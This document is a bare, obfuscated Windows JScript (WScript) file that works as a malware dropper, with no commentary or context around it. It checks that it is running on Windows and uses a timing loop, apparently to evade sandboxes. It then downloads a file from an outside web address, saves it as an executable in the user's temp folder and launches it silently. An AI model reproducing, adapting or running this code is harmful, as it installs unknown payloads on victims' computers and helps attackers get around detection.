var js = false;
var R = "CreateObject";
var wr = function kk() {return WScript[R]("WScript.Shell");}(), Ch = 11;
var x0 = "MSXML2.XMLHTTP";
var D = 2123213;
var X = 0;
function SD(jA){wr["Run"](jA, X, X);};
function q(){return "" + x0;};
function Ym(Y, XP){X = X * 1; return Y - XP;};
function ru(){return R;};
/*@cc_on
  @if (@_win32 || @_win64)
    js = true;
  @end
@*/
if (js)
{
var sx = "";
function Qg(){return 22;};
var mf = 0; var MU = 0;
function Cf()
{
var l = new this["Date"]();
var J = l["getUTCMilliseconds"]();
WScript["Sleep"](Qg());
var l = new this["Date"]();
var zF = l["getUTCMilliseconds"]();
WScript["Sleep"](Qg());
var l = new this["Date"]();
var x = l["getUTCMilliseconds"]();
var mf = "A";
mf = Ym(zF, J);
var MU = "Z";
MU = Ym(x, zF);
sx = "open";
return Ym(mf, MU);
}
var R0 = false;
var o = false;
for (var lJ = X; lJ < Qg() * 1; lJ++){if (Cf() != X){
R0 = true; 
MU = "31" + 11 * mf + MU; 
o = true; 
break;
}}
function M() {return ((R0 == true) && (R0 == o)) ? 1 : X;};
if (R0 && M() && o){
function vX() {return wr["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OqFOh7amp7Uqz.exe";};
 sw = q();
 dR = WScript[R](sw);
 var AS = 1;
 while (AS){
try {
dR[sx]("GET", "http://lojaagrometal.com.br/mi3sa", false);
dR["send"]();
T = "Sleep";
for (;;){WScript[T](Qg() * 11); if (dR["readystate"] >= 2 * 2) break;};
AS = X;
} catch(OQ){};
}
function AP(K) {var F = (1, 2, 3, 4, 5, K); return F;};
iY = WScript[ru()]("ADODB.Stream");
sw = iY;
sw[sx]();
sw["type"] = AP(1);
sw["write"](dR["ResponseBody"]);
iY["position"] = AP(X);
sw["Save" + "ToFile"](vX(), 2);
iY["c"+"lose"]();
Jl = vX();
SD(Jl);
}
}

